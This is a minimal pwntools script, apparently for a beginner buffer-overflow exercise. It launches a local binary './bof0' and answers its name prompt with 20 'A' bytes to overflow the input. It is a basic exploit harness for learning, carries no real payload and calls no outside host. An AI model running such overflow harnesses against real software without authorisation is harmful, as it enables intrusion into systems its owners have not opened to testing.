#!/usr/bin/python3
from pwn import *

p = process('./bof0')


p.recvuntil(b'name?')
p.sendline(b'A'*20)
p.interactive()